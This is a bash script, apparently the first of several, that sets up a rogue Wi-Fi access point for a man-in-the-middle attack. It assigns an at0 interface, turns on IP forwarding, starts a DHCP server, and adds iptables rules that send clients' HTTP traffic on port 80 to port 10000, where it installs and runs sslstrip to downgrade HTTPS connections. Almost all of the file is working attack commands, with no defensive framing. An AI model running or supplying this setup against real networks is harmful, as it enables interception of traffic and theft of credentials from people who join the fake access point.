#!/bin/bash

#                       example cfg     my cfg
# inet interface	eth0		wlan0
# inet conn IP          192.168.0.12    192.168.86.40
# inet gw IP            192.168.0.1     192.168.86.1

# rouge AP Interface    wlan0           wlan1
# rouge AP IP           192.168.1.1     192.168.1.1
# rouge AP gw IP

sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0
sudo ifconfig at0 mtu 1400 #prevent packet segmentation
sudo route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward #enable IP forwarding

sudo tee /etc/default/isc-dhcp-server <<EOF
INTERFACESv4="wlan1"
EOF

sudo sysctl net.ipv4.ip_forward #2x check that IP forwarding is on
# enter iptables rules
sudo iptables -t nat -A PREROUTING -p udp -j DNAT --to 192.168.86.1 #inet gw IP
sudo iptables -P FORWARD ACCEPT
sudo iptables --append FORWARD --in-interface at0 -j ACCEPT
sudo iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
sudo touch /var/lib/dhcp/dhcpd.leases #create dhcpd.leases if not already there
sudo dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0 #point to dhcp server config file
sudo /etc/init.d/isc-dhcp-server start #start dhcp server
sudo apt install sslstrip #install sslstrip

# at this point, you need to open a second terminal window to continue setup with rouge-wifi-setup-2.sh
echo "*************************************************************************"  
echo "open a third terminal window to continue setup with rouge-wifi-setup-3.sh"
echo "*************************************************************************"  
echo ""  
sslstrip -f -p -k 10000 #start sslstrip

